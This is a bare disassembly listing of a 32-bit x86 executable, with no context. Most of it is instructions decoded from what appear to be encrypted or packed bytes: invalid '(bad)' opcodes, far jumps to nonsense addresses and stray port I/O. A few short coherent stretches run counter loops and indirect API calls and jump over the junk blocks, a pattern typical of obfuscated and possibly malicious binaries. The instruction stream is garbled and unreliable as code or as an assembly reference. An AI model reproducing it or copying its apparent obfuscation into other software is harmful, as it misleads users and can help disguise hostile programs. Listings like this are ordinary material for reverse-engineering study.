  401862:	or     eax,0xe633c396
  401867:	pop    ebx
  401868:	mov    esp,DWORD PTR [edx-0x33]
  40186b:	lock push cs
  40186d:	arpl   WORD PTR [esi+ebp*4-0x4cc70d21],sp
  401874:	retf   0x7f88
  401877:	(bad)  
  401878:	fistp  WORD PTR [ebx+0x1fb95658]
  40187e:	mov    ch,0x86
  401880:	mov    ebx,0xc0b1bef4
  401885:	xchg   edi,eax
  401886:	daa    
  401887:	out    0x25,ax
  40188a:	lea    edi,[ebp-0x33b04d35]
  401890:	jnp    0x401822
  401892:	pop    edx
  401893:	enter  0xfeb1,0x85
  401897:	or     al,0x7b
  401899:	cmp    edx,DWORD PTR [bp+0x5f]
  40189d:	jne    0x401840
  40189f:	adc    eax,0x689b6f79
  4018a4:	lahf   
  4018a5:	add    bl,BYTE PTR [esi+0xcb710ee]
  4018ab:	add    ch,dl
  4018ad:	dec    ebp
  4018ae:	add    al,0x56
  4018b0:	call   0xf475:0xc61f5cb6
  4018b7:	ja     0x40189c
  4018b9:	mov    eax,ds:0xf9f2038c
  4018be:	adc    DWORD PTR [eax],eax
  4018c0:	push   ebp
  4018c1:	xchg   DWORD PTR [edi+0x71d19084],edi
  4018c7:	cwde   
  4018c8:	loope  0x401879
  4018ca:	test   DWORD PTR [edi+0x28],eax
  4018cd:	scas   eax,DWORD PTR es:[edi]
  4018ce:	dec    ebp
  4018cf:	test   BYTE PTR [edx-0x77],ch
  4018d2:	cwde   
  4018d3:	stos   DWORD PTR es:[edi],eax
  4018d4:	and    dh,dl
  4018d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018d7:	cmp    eax,0x99de42e0
  4018dc:	push   cs
  4018dd:	pop    ds
  4018de:	out    dx,al
  4018df:	mov    ebx,0x6c411f79
  4018e4:	outs   dx,BYTE PTR ds:[esi]
  4018e5:	ror    BYTE PTR [ebp-0x33ea208e],1
  4018eb:	faddp  st(7),st
  4018ed:	jns    0x4018a1
  4018ef:	(bad)  [edx+0x4b39d737]
  4018f5:	stc    
  4018f6:	mov    ch,0x5b
  4018f8:	jnp    0x401891
  4018fa:	arpl   WORD PTR [ecx+ebx*8+0x18d5edfc],bp
  401901:	imul   eax,DWORD PTR [ecx+0x10],0x35cca3d3
  401908:	cdq    
  401909:	mov    bh,0xad
  40190b:	pop    ss
  40190c:	lds    esp,FWORD PTR [edi]
  40190e:	stos   DWORD PTR es:[edi],eax
  40190f:	sar    ah,1
  401911:	ins    DWORD PTR es:[edi],dx
  401912:	mov    DWORD PTR [edx],edi
  401914:	int    0x9f
  401916:	fistp  QWORD PTR [ecx-0x77bf9aa]
  40191c:	cmp    ebx,DWORD PTR [ebx+eax*4-0x49f40fc4]
  401923:	inc    ebp
  401924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401925:	dec    edi
  401926:	loope  0x401937
  401928:	xor    bl,BYTE PTR [ecx]
  40192a:	adc    ch,BYTE PTR [edx]
  40192c:	inc    ebp
  40192d:	outs   dx,DWORD PTR ds:[esi]
  40192e:	add    dl,BYTE PTR [edx+0x46]
  401931:	push   ecx
  401932:	repz fbstp TBYTE PTR [ecx]
  401935:	repnz cmp DWORD PTR [ebx-0x1f],esi
  401939:	lods   al,BYTE PTR ds:[esi]
  40193a:	loopne 0x4019a7
  40193c:	(bad)  
  40193e:	rol    DWORD PTR [ebp+0x4760deae],0xbe
  401945:	(bad)  
  401946:	fwait
  401947:	es pop ebp
  401949:	aas    
  40194a:	(bad)  
  40194b:	cld    
  40194c:	sbb    eax,0xf44dc895
  401951:	enter  0xce6c,0xd2
  401955:	sti    
  401956:	adc    dl,bh
  401958:	push   0x5801c9dc
  40195d:	dec    ebx
  40195e:	fcomi  st,st(7)
  401960:	adc    al,BYTE PTR [esi-0x6cf36320]
  401966:	neg    eax
  401968:	inc    esi
  401969:	pop    ecx
  40196a:	mov    dh,0xef
  40196c:	lea    esi,[ebx+eax*1+0x66]
  401970:	adc    ebp,DWORD PTR [ecx]
  401972:	mov    esi,0xaeea6bbf
  401977:	sbb    DWORD PTR [ebp+0x6e],esi
  40197a:	push   ebp
  40197b:	pop    ds
  40197c:	mov    ebx,0x424a79ee
  401981:	es add eax,edi
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	mov    al,ds:0x82808619
  4019a8:	add    DWORD PTR [eax+0x78],edi
  4019ab:	(bad)  
  4019ac:	jle    0x401a26
  4019ae:	js     0x401996
  4019b0:	inc    edx
  4019b1:	or     edx,edx
  4019b3:	jno    0x4019f6
  4019b5:	sbb    edi,ecx
  4019b7:	push   edx
  4019b8:	das    
  4019b9:	dec    esp
  4019ba:	adc    eax,ecx
  4019bc:	lahf   
  4019bd:	cmp    DWORD PTR [ecx+0x66],edi
  4019c0:	jecxz  0x4019ee
  4019c2:	adc    dh,BYTE PTR [ebp-0x6422f635]
  4019c8:	scas   al,BYTE PTR es:[edi]
  4019c9:	leave  
  4019ca:	scas   al,BYTE PTR es:[edi]
  4019cb:	and    BYTE PTR [edi+0x4e],al
  4019ce:	push   ds
  4019cf:	xor    bl,BYTE PTR [edi+0x7a574f8c]
  4019d5:	cmc    
  4019d6:	cdq    
  4019d7:	jp     0x40197e
  4019d9:	sub    ch,bl
  4019db:	pop    eax
  4019dc:	push   esp
  4019dd:	lods   al,BYTE PTR ds:[esi]
  4019de:	mov    edx,0x8883905f
  4019e3:	push   esi
  4019e4:	mov    ecx,0x381a16c6
  4019e9:	mov    cl,0x72
  4019eb:	fisubr WORD PTR [eax+0x7a]
  4019ee:	rcl    DWORD PTR [eax+0x43cf8f7e],0x41
  4019f5:	xor    bh,BYTE PTR [eax-0x6765533b]
  4019fb:	jbe    0x4019ff
  4019fd:	cmp    eax,0x6fc8a299
  401a02:	lahf   
  401a03:	xchg   esi,eax
  401a04:	xchg   edi,eax
  401a05:	xchg   ebx,eax
  401a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a07:	out    dx,al
  401a08:	imul   ebx,DWORD PTR [edi],0xffffffff
  401a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a0d:	mov    edi,0xc3dd6302
  401a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a13:	sti    
  401a14:	arpl   WORD PTR [edx],di
  401a16:	and    DWORD PTR [ecx+0x7366108d],eax
  401a1c:	sahf   
  401a1d:	gs call 0x5bf353c0
  401a23:	pop    ebx
  401a24:	mov    bh,0xf7
  401a26:	call   0xb6ceece4
  401a2b:	jg     0x4019c1
  401a2d:	div    BYTE PTR [eax]
  401a2f:	sub    edi,esi
  401a31:	arpl   WORD PTR [ebx+0x4a],bx
  401a34:	je     0x401a02
  401a36:	sub    eax,0x27ad733f
  401a3b:	int    0xeb
  401a3d:	test   al,0x58
  401a3f:	and    eax,0xa198537b
  401a44:	lahf   
  401a45:	sbb    edx,DWORD PTR [edx-0x4d066d9b]
  401a4b:	retf   
  401a4c:	and    DWORD PTR ds:0x581db88e,esp
  401a52:	loopne 0x4019e8
  401a54:	ins    DWORD PTR es:[edi],dx
  401a55:	je     0x4019d9
  401a57:	push   ebp
  401a58:	inc    esi
  401a59:	cdq    
  401a5a:	mov    ebp,0x9d892a05
  401a5f:	data16 ficomp DWORD PTR [edx]
  401a62:	xor    al,al
  401a64:	adc    al,BYTE PTR [ebp-0x6]
  401a67:	inc    esi
  401a68:	shl    BYTE PTR [ebp-0x206fc3a4],cl
  401a6e:	add    dl,BYTE PTR [edx+0xe]
  401a71:	jl     0x4019fd
  401a73:	(bad)
  401a77:	xchg   esp,eax
  401a78:	xchg   esi,eax
  401a79:	frstor [ecx+0x4dfa09a5]
  401a7f:	in     eax,0x95
  401a81:	out    0xc8,al
  401a83:	dec    eax
  401a84:	mov    dh,BYTE PTR [edx+edi*4]
  401a87:	xchg   ebp,eax
  401a88:	xchg   edx,eax
  401a89:	ins    DWORD PTR es:[edi],dx
  401a8a:	jp     0x401aaa
  401a8c:	dec    esi
  401a8d:	cli    
  401a8e:	xor    al,0xeb
  401a90:	int    0x75
  401a92:	(bad)  
  401a94:	mov    eax,ds:0x2fda37ee
  401a99:	mov    eax,0xfb2325cb
  401a9e:	outs   dx,DWORD PTR ds:[esi]
  401a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aa0:	cmp    edi,DWORD PTR ds:0xa2669d89
  401aa6:	add    eax,0x22f50822
  401aab:	pop    ds
  401aac:	jg     0x401b23
  401aae:	mov    ch,0x54
  401ab0:	xor    DWORD PTR [ebp+eax*8-0x61],0x4e
  401ab5:	ret    0xd682
  401ab8:	sar    BYTE PTR [edi],1
  401aba:	aas    
  401abb:	add    al,0x15
  401abd:	xchg   ebp,eax
  401abe:	jbe    0x401a57
  401ac0:	and    DWORD PTR [esi+0x65],0x74
  401ac4:	icebp  
  401ac5:	sbb    eax,0xea7566a9
  401aca:	mov    ch,0xc7
  401acc:	push   cs
  401acd:	dec    esp
  401ace:	jns    0x401af0
  401ad0:	sbb    al,0x9f
  401ad2:	jb     0x401a62
  401ad4:	call   0x22a5f3b5
  401ad9:	sbb    BYTE PTR [ebp-0x2d],ch
  401adc:	jmp    0x4b2b:0x71990254
  401ae3:	mov    edi,0x3b6e8cda
  401ae8:	repz jne 0x401a7d
  401aeb:	bswap  eax
  401aed:	sbb    esp,DWORD PTR [ecx+0x62]
  401af0:	mov    ?,WORD PTR [ecx-0x7d5d4fbe]
  401af6:	xchg   esp,eax
  401af7:	xor    bl,al
  401af9:	adc    BYTE PTR [eax+0x2],bh
  401afc:	push   ds
  401afd:	xlat   BYTE PTR ds:[ebx]
  401afe:	or     al,0x3
  401b00:	mov    al,es:0x93c60833
  401b06:	fst    QWORD PTR [edi+0x70]
  401b09:	test   al,0x37
  401b0b:	add    esp,DWORD PTR [esi-0x4b]
  401b0e:	mov    al,ds:0x54e07a5e
  401b13:	jecxz  0x401b8c
  401b15:	inc    ecx
  401b16:	std    
  401b17:	mov    WORD PTR [edx+0x652671d3],ss
  401b1d:	mov    eax,0x8a580f9f
  401b22:	pop    ebx
  401b23:	mov    ch,0xa1
  401b25:	lds    esp,FWORD PTR [eax-0x4a]
  401b28:	adc    al,0x5f
  401b2a:	push   cs
  401b2b:	ins    BYTE PTR es:[edi],dx
  401b2c:	sbb    al,0x29
  401b2e:	xlat   BYTE PTR ds:[ebx]
  401b2f:	mov    ebp,0x8d7f31a5
  401b34:	xor    al,0xf9
  401b36:	ds cs (bad) 
  401b39:	jp     0x401b26
  401b3b:	xor    DWORD PTR [ebx+0x18],ebp
  401b3e:	je     0x401b89
  401b40:	cmp    BYTE PTR [edi],dh
  401b42:	cmp    al,BYTE PTR [ecx-0x6]
  401b45:	push   0xcd6ffb7c
  401b4a:	int    0x8a
  401b4c:	sub    bh,ah
  401b4e:	cdq    
  401b4f:	clc    
  401b50:	ds mov cl,0xa1
  401b53:	je     0x401b10
  401b55:	add    al,0xb2
  401b57:	dec    ebp
  401b58:	faddp  st(6),st
  401b5a:	push   ebp
  401b5b:	daa    
  401b5c:	adc    ecx,DWORD PTR [esi+0x72]
  401b5f:	adc    eax,0xd3617c5e
  401b64:	sbb    ebp,ebp
  401b66:	push   ebx
  401b67:	dec    esp
  401b68:	cmp    BYTE PTR [ebp-0x40],dl
  401b6b:	rcl    ah,1
  401b6d:	and    eax,0x30bd6891
  401b72:	xor    DWORD PTR [ebx+0x477f7cc7],esp
  401b78:	dec    ecx
  401b79:	inc    edx
  401b7a:	(bad)  [eax]
  401b7c:	inc    edi
  401b7d:	fucomip st,st(3)
  401b7f:	stos   DWORD PTR es:[edi],eax
  401b80:	repnz push eax
  401b82:	sbb    al,0x52
  401b84:	and    DWORD PTR [ebp+ebx*4+0x70],0xffffffe6
  401b89:	and    al,BYTE PTR [edx-0x6d35d553]
  401b8f:	inc    edi
  401b90:	pop    ds
  401b91:	std    
  401b92:	pop    ds
  401b93:	xor    DWORD PTR [edx],ebp
  401b95:	jl     0x401b83
  401b97:	pop    es
  401b98:	neg    esi
  401b9a:	jo     0x401beb
  401b9c:	pop    ebp
  401b9d:	outs   dx,DWORD PTR ds:[esi]
  401b9e:	or     ebp,DWORD PTR [ecx-0x607adc9a]
  401ba4:	(bad)  
  401ba5:	push   esp
  401ba6:	ret    0x3a06
  401ba9:	(bad)  
  401baa:	pop    esp
  401bab:	jne    0x401b3d
  401bad:	loopne 0x401bea
  401baf:	outs   dx,BYTE PTR ds:[esi]
  401bb0:	aam    0xb2
  401bb2:	int    0xcd
  401bb4:	sbb    esp,ecx
  401bb6:	arpl   WORD PTR [edx-0x3996a616],bp
  401bbc:	sub    DWORD PTR [esp+ecx*1-0x55597ed9],edx
  401bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bc4:	or     edi,DWORD PTR [ebp-0x77]
  401bc7:	popa   
  401bc8:	fst    QWORD PTR [esi+0x55]
  401bcb:	mov    ch,0x59
  401bcd:	test   DWORD PTR [eax],esp
  401bcf:	in     al,0x7f
  401bd1:	(bad)  
  401bd2:	mov    WORD PTR [ebx],gs
  401bd4:	sub    DWORD PTR [ebp-0x5767bf6b],edi
  401bda:	pop    ecx
  401bdb:	pop    edi
  401bdc:	sbb    cl,BYTE PTR [edx+0x7092d269]
  401be2:	or     BYTE PTR [edi],ah
  401be4:	inc    edi
  401be5:	mov    cl,BYTE PTR [ebx-0x410fdd7a]
  401beb:	(bad)  
  401bec:	fst    QWORD PTR [ecx+0x63]
  401bef:	cld    
  401bf0:	xchg   esi,eax
  401bf1:	mov    cl,BYTE PTR [ecx-0x5]
  401bf4:	jmp    0x401bf5
  401bf6:	push   es
  401bf7:	and    eax,0xff85c9c8
  401bfc:	jecxz  0x401c42
  401bfe:	dec    eax
  401bff:	sahf   
  401c00:	test   ebx,esi
  401c02:	loope  0x401c55
  401c04:	pop    edx
  401c05:	scas   eax,DWORD PTR es:[edi]
  401c06:	or     DWORD PTR [ebx+0x2f],ecx
  401c09:	das    
  401c0a:	scas   al,BYTE PTR es:[edi]
  401c0b:	inc    eax
  401c0c:	dec    sp
  401c0e:	(bad)  [ecx+0x3a3e64f8]
  401c14:	out    dx,al
  401c15:	fwait
  401c16:	push   ebx
  401c17:	pop    esp
  401c18:	in     eax,dx
  401c19:	lods   eax,DWORD PTR ds:[esi]
  401c1a:	add    DWORD PTR [ecx+0x20b7fe96],eax
  401c20:	xor    eax,0xdf0d1f9a
  401c25:	and    BYTE PTR ds:0xb3b04760,dh
  401c2b:	hlt    
  401c2c:	call   0x894d708f
  401c31:	mov    DWORD PTR [ebp-0x20],eax
  401c34:	and    DWORD PTR ds:0x42a83d,0x0
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a83d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a83d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a83d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a83d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa2e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a83d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a83d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a83d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a761,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a775
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a769
  401cbe:	and    eax,DWORD PTR ds:0x42a7b9
  401cc4:	mov    ds:0x42a769,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a7f9,0x42a801
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a77d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0xfcba
  401d05:	fcomp  DWORD PTR [ebx+0x78060074]
  401d0b:	js     0x401d0b
  401d0d:	jle    0x401d87
  401d0f:	js     0x401cc0
  401d11:	cmp    DWORD PTR [ebp+0x1c],esi
  401d14:	fcmovu st,st(5)
  401d16:	fist   DWORD PTR [edx]
  401d18:	push   esp
  401d19:	sub    edi,DWORD PTR [esi]
  401d1b:	mov    edx,0x3311714c
  401d20:	ins    BYTE PTR es:[edi],dx
  401d21:	ins    DWORD PTR es:[edi],dx
  401d22:	xor    BYTE PTR ss:[eax],ah
  401d25:	xchg   ecx,eax
  401d26:	dec    esp
  401d27:	loop   0x401d52
  401d29:	leave  
  401d2a:	stc    
  401d2b:	inc    edi
  401d2c:	or     edx,esp
  401d2e:	das    
  401d2f:	xchg   edx,eax
  401d30:	mov    dl,0xe6
  401d32:	int3   
  401d33:	push   0xffffffbb
  401d35:	idiv   BYTE PTR [ecx+0x3b03e2c4]
  401d3b:	cwde   
  401d3c:	jge    0x401d09
  401d3e:	sbb    edx,eax
  401d40:	push   edx
  401d41:	arpl   WORD PTR [esi-0x33],bp
  401d44:	scas   al,BYTE PTR es:[edi]
  401d45:	push   ds
  401d46:	jno    0x401ce3
  401d48:	mov    bl,0x1d
  401d4a:	mov    al,ds:0x53ad522a
  401d4f:	mov    al,0xe0
  401d51:	push   esp
  401d52:	stos   BYTE PTR es:[edi],al
  401d53:	lds    esp,FWORD PTR [ecx]
  401d55:	xchg   ecx,eax
  401d56:	call   0x1064df62
  401d5b:	xor    edx,DWORD PTR [ecx]
  401d5d:	jnp    0x401dbd
  401d5f:	nop
  401d60:	mov    ds:0x4b7de824,al
  401d65:	mov    eax,ds:0x8eab304a
  401d6a:	inc    esp
  401d6b:	lahf   
  401d6c:	lock in eax,0xe7
  401d6f:	jle    0x401dc0
  401d71:	xlat   BYTE PTR ds:[ebx]
  401d72:	xchg   edx,eax
  401d73:	jmp    0x965920af
  401d78:	mov    DWORD PTR [ebp+0x733edd2c],ebx
  401d7e:	call   0x54acabd
  401d83:	dec    ebx
  401d84:	sub    DWORD PTR [edi],esi
  401d86:	pop    ss
  401d87:	fisttp WORD PTR [eax-0x1180b36a]
  401d8d:	nop
  401d8e:	inc    edi
  401d8f:	rcl    BYTE PTR [edi+0x2a0b626],0xa0
  401d96:	cwde   
  401d97:	fsubr  DWORD PTR [edx+0x3f]
  401d9a:	mov    edx,0xccac6a7b
  401d9f:	xchg   ecx,eax
  401da0:	inc    edx
  401da1:	mov    WORD PTR [esi],fs
  401da3:	or     ecx,DWORD PTR [ebx]
  401da5:	mov    WORD PTR ds:0xb1a408c5,fs
  401dab:	inc    esi
  401dac:	sti    
  401dad:	imul   ebx,DWORD PTR [edi+0x74],0x6fb63960
  401db4:	xor    al,0x4e
  401db6:	sub    ch,BYTE PTR [ebp-0x65]
  401db9:	and    bl,BYTE PTR [edx-0xe]
  401dbc:	mov    ?,WORD PTR [ebx-0xb]
  401dbf:	sbb    BYTE PTR ds:0x26328331,dh
  401dc5:	xchg   DWORD PTR [ebp-0x3228c112],edx
  401dcb:	ret    
  401dcc:	jns    0x401de3
  401dce:	fist   DWORD PTR [ebp-0x16c6919f]
  401dd4:	pop    esp
  401dd5:	sub    al,0xad
  401dd7:	xor    edi,DWORD PTR [ecx+0x721335e4]
  401ddd:	mov    bl,0x35
  401ddf:	aad    0x25
  401de1:	sbb    dh,BYTE PTR [ebp-0x273001e0]
  401de7:	pop    ss
  401de8:	mov    BYTE PTR [edi+0x334d0148],dl
  401dee:	push   esp
  401def:	ficom  DWORD PTR [eax]
  401df1:	add    edx,esi
  401df3:	aaa    
  401df4:	jno    0x401e48
  401df6:	or     al,0x48
  401df8:	cmp    BYTE PTR [ecx-0x1e],al
  401dfb:	mul    BYTE PTR [esi]
  401dfd:	pop    ebx
  401dfe:	jno    0x401e2c
  401e00:	jge    0x401d88
  401e02:	inc    ebp
  401e03:	jb     0x401d87
  401e05:	ret    0xe926
  401e08:	jmp    0x347954cc
  401e0d:	(bad)  
  401e0e:	ds nop
  401e10:	les    ebx,FWORD PTR [ebx+0x60ca3c6e]
  401e16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e17:	lds    esi,FWORD PTR [ebp+0x4d]
  401e1a:	nop
  401e1b:	pushf  
  401e1c:	in     eax,dx
  401e1d:	mov    esp,0x49b2851f
  401e22:	and    ah,BYTE PTR [edx+0x2c]
  401e25:	mov    esi,0xef5ee78f
  401e2a:	sbb    ecx,DWORD PTR [edi]
  401e2c:	outs   dx,DWORD PTR ds:[esi]
  401e2d:	ja     0x401db5
  401e2f:	pusha  
  401e30:	hlt    
  401e31:	push   ds
  401e32:	outs   dx,DWORD PTR ds:[esi]
  401e33:	inc    esi
  401e34:	xchg   edx,ebp
  401e36:	stc    
  401e37:	idiv   DWORD PTR [edi-0x7f]
  401e3a:	jns    0x401e6c
  401e3c:	or     edx,DWORD PTR [ebp+0x21b54427]
  401e42:	xor    al,0x7c
  401e44:	fwait
  401e45:	pop    eax
  401e46:	sub    BYTE PTR [ebp-0x3d],dh
  401e49:	xchg   DWORD PTR [ecx+0x79],eax
  401e4c:	ret    
  401e4d:	or     ch,BYTE PTR [esi+0x6]
  401e50:	retf   
  401e51:	sbb    al,0x9b
  401e53:	stos   DWORD PTR es:[edi],eax
  401e54:	jge    0x401e1b
  401e56:	icebp  
  401e57:	and    al,0x62
  401e59:	add    eax,0x73e58a2f
  401e5e:	imul   ebp,DWORD PTR [edi+0x5f],0xc2b992be
  401e65:	pusha  
  401e66:	adc    DWORD PTR [edx+0x3a271e3d],edx
  401e6c:	into   
  401e6d:	mov    al,ds:0xaef67b9b
  401e72:	pop    edx
  401e73:	jmp    0xda9751b4
  401e78:	jle    0x401e1c
  401e7a:	adc    al,0xf6
  401e7c:	pop    es
  401e7d:	sbb    bh,BYTE PTR [edi-0x2c]
  401e80:	out    dx,eax
  401e81:	xor    BYTE PTR [ebp+ecx*4+0x5217446d],0xc9
  401e89:	xchg   eax,eax
  401e8b:	sub    esp,eax
  401e8d:	ret    
  401e8e:	lea    edx,cs:[esi+0x5d]
  401e92:	dec    ebx
  401e93:	adc    ch,bl
  401e95:	push   esp
  401e96:	out    0xc6,al
  401e98:	mov    eax,0x8569c6e0
  401e9d:	and    bh,ch
  401e9f:	sbb    al,0xff
  401ea1:	loop   0x401eba
  401ea3:	sbb    eax,0xed178665
  401ea8:	add    ebx,DWORD PTR [edx]
  401eaa:	clc    
  401eab:	jl     0x401eaf
  401ead:	ret    0xc290
  401eb0:	inc    ebp
  401eb1:	push   ebp
  401eb2:	push   ss
  401eb3:	or     ebp,DWORD PTR [ebx+edx*2+0x76a2b1d0]
  401eba:	jae    0x401e53
  401ebc:	call   0xaad182a8
  401ec1:	xchg   ebp,ebx
  401ec3:	cmp    bh,ch
  401ec5:	imul   BYTE PTR [edx-0x15d06857]
  401ecb:	inc    eax
  401ecc:	push   0xfffffffe
  401ece:	xor    al,0xbb
  401ed0:	sbb    al,0x27
  401ed2:	mov    esp,0x2386cf66
  401ed7:	cmp    bl,BYTE PTR [ebx+ebx*2-0x36]
  401edb:	push   esp
  401edc:	retf   
  401edd:	daa    
  401ede:	cli    
  401edf:	das    
  401ee0:	ja     0x401e97
  401ee2:	xor    bh,ah
  401ee4:	adc    BYTE PTR [eax+edi*1],0xd7
  401ee8:	mov    ebx,fs
  401eea:	jno    0x401f23
  401eec:	cli    
  401eed:	push   ss
  401eee:	jecxz  0x401f42
  401ef0:	xor    DWORD PTR [edi],esp
  401ef2:	test   BYTE PTR [esi+0x38],ah
  401ef5:	scas   al,BYTE PTR es:[edi]
  401ef6:	xor    dh,BYTE PTR [ecx+0x5e74e90e]
  401efc:	aas    
  401efd:	aas    
  401efe:	mov    ecx,0xcb886d32
  401f03:	xchg   ah,al
  401f05:	out    dx,al
  401f06:	out    dx,al
  401f07:	andps  xmm3,XMMWORD PTR [esi+0x22]
  401f0b:	or     BYTE PTR [ebp+0x66],0xeb
  401f0f:	bound  esi,QWORD PTR [ecx]
  401f11:	pop    eax
  401f12:	jb     0x401efb
  401f14:	jmp    0x401f42
  401f16:	out    0x53,eax
  401f18:	lock mov bh,0x1a
  401f1b:	call   0x20c99378
  401f20:	jmp    0x401f2c
  401f22:	pop    eax
  401f23:	xchg   ecx,eax
  401f24:	mov    dh,0x19
  401f26:	ror    DWORD PTR [eax-0x3e],1
  401f29:	and    eax,0x1ff9feb2
  401f2e:	shl    BYTE PTR [edi],1
  401f30:	int    0x63
  401f32:	repz (bad) 
  401f34:	out    dx,al
  401f35:	enter  0xbb20,0x9a
  401f39:	(bad)  
  401f3a:	(bad)  [esi+0x50]
  401f3d:	push   edx
  401f3e:	push   0x95a8fba1
  401f43:	dec    esi
  401f44:	loop   0x401f29
  401f46:	fucomp st(6)
  401f48:	test   BYTE PTR [edx+0x32],al
  401f4b:	aam    0x12
  401f4d:	(bad)  
  401f4f:	cmp    al,0xe6
  401f51:	enter  0xa8f9,0xf2
  401f55:	scas   eax,DWORD PTR es:[edi]
  401f56:	cmp    dl,BYTE PTR [edx+0x57192536]
  401f5c:	dec    ecx
  401f5d:	pop    eax
  401f5e:	xchg   esp,eax
  401f5f:	jae    0x401fbb
  401f61:	scas   al,BYTE PTR es:[edi]
  401f62:	ret    0xd143
  401f65:	dec    ebx
  401f66:	push   esi
  401f67:	mov    al,ds:0x59919fb8
  401f6c:	popa   
  401f6d:	cli    
  401f6e:	js     0x401f35
  401f70:	in     al,dx
  401f71:	sub    BYTE PTR [ecx],0x4f
  401f74:	jecxz  0x401f11
  401f76:	sub    BYTE PTR [edx],bh
  401f78:	out    dx,eax
  401f79:	dec    esi
  401f7a:	cmp    esi,DWORD PTR [ecx-0x1a938c3]
  401f80:	jae    0x401f37
  401f82:	loope  0x401f9f
  401f84:	not    BYTE PTR [eax]
  401f86:	sar    DWORD PTR [ebx+0xd],cl
  401f89:	dec    esi
  401f8a:	add    DWORD PTR ss:0x3bdcd038,ebx
  401f91:	inc    edi
  401f92:	add    ecx,DWORD PTR [eax]
  401f94:	xor    eax,eax
  401f96:	add    eax,DWORD PTR ds:0x42a839
  401f9c:	and    eax,DWORD PTR ds:0x42a889
  401fa2:	mov    ds:0x42a839,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42a7f1,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42a759,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42a759
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a759,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a759,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a759,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [edi-0xf],ebx
  402019:	inc    eax
  40201a:	push   ecx
  40201b:	xchg   BYTE PTR [eax+edi*2],al
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x402052
  402024:	adc    al,0xef
  402026:	mov    ds:0xd6ae39ca,al
  40202b:	and    eax,0x4036425
  402030:	add    DWORD PTR [ebx+0x3f],ebp
  402033:	test   eax,0x1dc3600e
  402038:	fwait
  402039:	hlt    
  40203a:	imul   ebp,esi,0x4b
  40203d:	xchg   esp,eax
  40203e:	mov    al,ds:0x475cad54
  402043:	inc    ebx
  402044:	fst    DWORD PTR [eax]
  402046:	cmp    DWORD PTR [ecx],edi
  402048:	adc    al,0x16
  40204a:	rcr    BYTE PTR [ecx],1
  40204c:	pop    esp
  40204d:	cmp    BYTE PTR [ecx],ch
  40204f:	cmp    eax,esi
  402051:	add    eax,DWORD PTR [ecx+edi*1-0x21]
  402055:	cwde   
  402056:	xchg   esi,eax
  402057:	xchg   edx,eax
  402058:	clc    
  402059:	ds stos DWORD PTR es:[edi],eax
  40205b:	addr16 popa 
  40205d:	sar    DWORD PTR [edx*1-0x5f343127],1
  402064:	(bad)  
  402065:	mov    bl,0xc8
  402067:	jmp    0x272d3605
  40206c:	cmp    DWORD PTR [ecx-0x17],edx
  40206f:	(bad)  
